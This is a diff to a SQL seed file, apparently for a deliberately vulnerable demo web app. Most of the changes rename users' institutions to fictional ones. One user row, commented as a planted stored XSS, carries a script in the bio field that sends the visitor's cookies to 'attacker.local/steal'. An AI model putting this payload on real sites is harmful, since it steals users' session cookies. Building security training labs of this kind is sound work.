@@ -37,36 +37,36 @@ INSERT INTO user_profiles (user_id, full_name, bio, phone, institution) VALUES
 
     (2, 'Ahmad Razif bin Zulkifli',
         'Senior lecturer in Computer Science with 10 years of industry experience in Malaysia.',
-        '+6012-345-6789', 'Multimedia University'),
+        '+6012-345-6789', 'Meridian Institute of Technology'),
 
     (3, 'Nurul Aina binti Hamdan',
         'Certified data analyst and Python enthusiast. Passionate about making data science accessible.',
-        '+6011-222-3344', 'Universiti Malaya'),
+        '+6011-222-3344', 'Northfield University'),
 
     -- Stored XSS payload planted in bio field
     (4, 'Ali Hassan bin Ibrahim',
         'Passionate student. <script>document.cookie="xss_demo="+document.cookie; fetch("http://attacker.local/steal?c="+document.cookie);</script>',
-        '+6013-111-2222', 'Universiti Teknologi Malaysia'),
+        '+6013-111-2222', 'Lakeside Institute of Computing'),
 
     (5, 'Siti Rahimah binti Azman',
         'Final year student studying Software Engineering. Loves building web apps.',
-        '+6014-555-6677', 'Universiti Putra Malaysia'),
+        '+6014-555-6677', 'Bayview University'),
 
     (6, 'Raj Kumar a/l Subramaniam',
         'Computer Science undergraduate interested in cybersecurity and ethical hacking.',
-        '+6016-789-0123', 'Universiti Kebangsaan Malaysia'),
+        '+6016-789-0123', 'Crestwood University'),
 
     (7, 'Wei Liang Tan',
         'Aspiring data scientist. Currently pursuing a degree in Information Technology.',
-        '+6017-234-5678', 'TARUMT'),
+        '+6017-234-5678', 'Harbourpoint College'),
 
     (8, 'Farah Nadia binti Othman',
         'Enthusiastic learner exploring the world of AI and machine learning.',
-        '+6018-345-6789', 'HELP University'),
+        '+6018-345-6789', 'Ironwood Institute of Science'),
 
     (9, 'Danial Hakimi bin Roslan',
         'Network engineering student with a passion for IoT and embedded systems.',
-        '+6019-456-7890', 'Universiti Teknikal Malaysia Melaka');
+        '+6019-456-7890', 'Silverpine Institute of Engineering');
 
 -- CATEGORIES
 INSERT INTO categories (id, name, slug, description) VALUES
